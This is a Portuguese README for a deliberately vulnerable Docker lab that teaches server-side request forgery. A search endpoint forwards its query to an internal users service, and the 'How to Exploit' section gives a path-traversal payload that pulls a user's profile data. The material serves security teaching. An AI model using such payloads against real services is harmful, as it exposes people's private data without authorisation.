# SSRF

## Setup

Para executar este laboratório você precisará ter instalado em sua máquina:

- [Docker](https://docs.docker.com/get-docker/)
- [Docker Compose](https://docs.docker.com/compose/install/)


## Run

Para rodar este laboratório em sua máquina, rode:

```sh
sh start.sh
```

Para ver se está tudo funcionando, basta abrir o browser na url `http://localhost:5001`.

Você deverá ver uma página com o título `CNVS` e uma lista de nomes.


## How it Works
Este laboratório possui uma lista de pessoas na página principal, que executa este request:

```
http://localhost:5001/search-users?q=
```

E retorna este response:

```json
{
  "result": [
    {
      "id": "11076ed0-298d-40f2-94e7-71c1e60a64fa",
      "name": "Alice Williams"
    },
    {
      "id": "5982c3fc-629c-4ef8-bf18-7900685a1f16",
      "name": "Bob Hand"
    },
    {
      "id": "a1c08d96-b26f-499f-bf7f-d5f17048fb04",
      "name": "Carl McLoan"
    }
  ]
}
```

Para isto, internamente esta api chama outro microserviço:

```
http://users:5002/search/{query}
```

Este parâmetro `{query}` vem da query string `?q=` da primeira chamada.

## How to Exploit

Para obter os dados do usuário, basta executar no browser:

```
http://localhost:5001/search-users?q=../../profile/{id do usuário}
```

Ele vai retornar os dados do usuário

```json
{
  "result": {
    "email": "alice@conviso.com",
    "id": "11076ed0-298d-40f2-94e7-71c1e60a64fa",
    "name": "Alice Williams",
    "phone": "11987654321"
  }
}
```